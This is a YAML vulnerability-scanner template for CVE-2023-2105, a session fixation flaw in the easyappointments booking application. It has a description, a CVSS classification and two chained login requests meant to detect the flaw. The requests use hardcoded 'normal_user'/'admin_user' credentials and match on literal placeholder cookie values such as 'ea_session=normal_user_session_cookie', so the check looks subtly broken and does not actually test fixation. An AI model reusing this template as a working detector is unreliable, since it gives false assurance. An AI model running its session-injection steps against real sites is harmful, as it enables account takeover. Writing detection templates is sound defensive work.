id: CVE-2023-2105

info:
  name: Session Fixation in easyappointments
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The easyappointments application is vulnerable to a Session Fixation vulnerability.
    After a user successfully authenticates into the application, the application does not generate a new ea_session cookie.
    This allows a malicious user to create a new session cookie value and inject it to a victim.
    When the victim logs in, the injected cookie becomes valid, giving the attacker access to the user's account through the active session.
    Additionally, the vulnerability allows for privilege escalation, where a current user can escalate their privileges to an admin user by injecting their session cookie and letting the admin login using the cookie.
    Since the application allows concurrent logins, the admin user will not be aware that their session has been taken over.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive information or perform actions on behalf of the user.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version of easyappointments to mitigate the Session Fixation vulnerability (CVE-2023-2105).
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2023-2105
    cwe-id: CWE-384
    epss-score: 0.00259
    epss-percentile: 0.6597
    cpe: cpe:2.3:a:easyappointments:easyappointments:*:*:*:*:*:*:*:*
  metadata:
    vendor: easyappointments
    product: easyappointments

http:
  - method: POST
    path:
      - "{{BaseURL}}/login"

    headers:
      Content-Type: application/json

    body: |
      {"username": "normal_user", "password": "password"}
    matchers:
      - type: word
        words:
          - "ea_session=normal_user_session_cookie"
        part: header

  - method: POST
    path:
      - "{{BaseURL}}/login"

    headers:
      Content-Type: application/json
      Cookie: "ea_session=normal_user_session_cookie"

    body: |
      {"username": "admin_user", "password": "password"}
    matchers:
      - type: word
        words:
          - "ea_session=admin_session_cookie"
        part: header
